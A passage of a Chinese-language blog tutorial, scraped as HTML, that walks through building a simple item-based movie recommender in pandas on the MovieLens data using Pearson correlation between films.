class=\"crayon-v\">movieStats</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'rating'</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'size'</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ratingsCount</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449e0002922382775-4\"><span class=\"crayon-v\">movieStats</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">popularMovies</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sort_values</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'rating'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'mean'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ascending</span><span class=\"crayon-o\">=</span><span class=\"crayon-t\">False</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">15</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0016 seconds] -->\r\n<p>5.提取与目标电影相类似的流行电影</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625449e0005477733572\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndf = movieStats[popularMovies].join(pd.DataFrame(similarMovies, columns=['similarity']))\r\ndf.sort_values(['similarity'], ascending=False)[:15]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625449e0005477733572-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449e0005477733572-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625449e0005477733572-1\"><span class=\"crayon-v\">df</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">movieStats</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">popularMovies</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">join</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">pd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">DataFrame</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">similarMovies</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">columns</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'similarity'</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449e0005477733572-2\"><span class=\"crayon-v\">df</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sort_values</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'similarity'</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ascending</span><span class=\"crayon-o\">=</span><span class=\"crayon-t\">False</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">15</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p></p>\n<h3>第二步：基于用户的所有评分做出推荐</h3>\n<p>1.生成每两部电影之间的相似度，并只保留流行电影的相似度</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625449e0009003110246\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nuserRatings = ratings.pivot_table(index=['user_id'],columns=['title'],values='rating')\r\ncorrMatrix = userRatings.corr(method='pearson', min_periods=100)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625449e0009003110246-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449e0009003110246-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625449e0009003110246-1\"><span class=\"crayon-v\">userRatings</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ratings</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">pivot_table</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">index</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'user_id'</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">columns</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'title'</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">values</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'rating'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449e0009003110246-2\"><span class=\"crayon-v\">corrMatrix</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">userRatings</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">corr</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">method</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'pearson'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">min_periods</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">100</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>2.对于每部用户看过并评分过的电影，生成推荐（这里我们选择用户0）</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625449e000d689750398\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmyRatings = userRatings.loc[0].dropna()\r\nsimCandidates = pd.Series()\r\nfor i in range(0, len(myRatings.index)):\r\n    #取出与评分过电影相似的电影\r\n    sims = corrMatrix[myRatings.index[i]].dropna()\r\n    #以用户对这部电影的评分高低来衡量它的相似性\r\n    sims = sims.map(lambda x: x * myRatings[i])\r\n    #将结果放入相似性候选列表中\r\n    simCandidates = simCandidates.append(sims)\r\n\r\nsimCandidates.sort_values(inplace = True, ascending = False)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625449e000d689750398-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449e000d689750398-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b625449e000d689750398-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449e000d689750398-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b625449e000d689750398-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449e000d689750398-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b625449e000d689750398-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449e000d689750398-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b625449e000d689750398-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449e000d689750398-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b625449e000d689750398-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625449e000d689750398-1\"><span class=\"crayon-v\">myRatings</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">userRatings</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">loc</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">dropna</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449e000d689750398-2\"><span class=\"crayon-v\">simCandidates</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Series</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b625449e000d689750398-3\"><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">range</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">len</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">myRatings</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449e000d689750398-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\">#取出与评分过电影相似的电影</span></div><div class=\"crayon-line\" id=\"crayon-5b625449e000d689750398-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">sims</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">corrMatrix</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">myRatings</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">dropna</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449e000d689750398-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\">#以用户对这部电影的评分高低来衡量它的相似性</span></div><div class=\"crayon-line\" id=\"crayon-5b625449e000d689750398-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">sims</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sims</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">map</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">lambda</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">x *</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">myRatings</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449e000d689750398-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\">#将结果放入相似性候选列表中</span></div><div class=\"crayon-line\" id=\"crayon-5b625449e000d689750398-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">simCandidates</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">simCandidates</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">append</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sims</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449e000d689750398-10\"> </div><div class=\"crayon-line\" id=\"crayon-5b625449e000d689750398-11\"><span class=\"crayon-v\">simCandidates</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sort_values</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">inplace</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">True</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ascending</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">False</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0024 seconds] -->\r\n<p>3.将所有相同电影的相似度加和</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625449e0010014782982\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsimCandidates = simCandidates.groupby(simCandidates.index).sum()\r\nsimCandidates.sort_values(inplace = True, ascending = False)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625449e0010014782982-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b625449e0010014782982-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625449e0010014782982-1\"><span class=\"crayon-v\">simCandidates</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">simCandidates</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">groupby</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">simCandidates</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sum</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b625449e0010014782982-2\"><span class=\"crayon-v\">simCandidates</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sort_values</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">inplace</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">True</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ascending</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">False</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>4.只保留用户没有看过的电影</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625449e0014951844428\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfilteredSims = simCandidates.drop(myRatings.index)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b625449e0014951844428-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b625449e0014951844428-1\"><span class=\"crayon-v\">filteredSims</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">simCandidates</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">drop</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">myRatings</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<h2>如何更进一步？</h2>\n<p>在上面的实例中，Pandas与我们的CPU足以处理MovieLens的数据集。然而，当数据集变得更庞大时，处理的时间也会变得更加漫长。因此，你应该转为使用具有更强大处理能力的解决方案，如Spark或MapReduce。</p>\n<p>我希望我已经成功让你看到，实现一个简单而有效的推荐系统中并没有什么复杂之处。如果你有任何问题，不要犹豫，直接评论就好了。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114167\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114167votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114167\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/q2346410846\">Marticles</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/q2346410846\">\r\n\t\t\t<img src=\"http://q.qlogo.cn/qqapp/208656/6D3A7551E1BB7FD4B870CD034C2353ED/100\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            Just for fun.        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/q2346410846\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/q2346410846/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/q2346410846/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 11</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/a1c098d53f6a2f9782a4c4f516aeb6dda3aab6a2.jpg"}
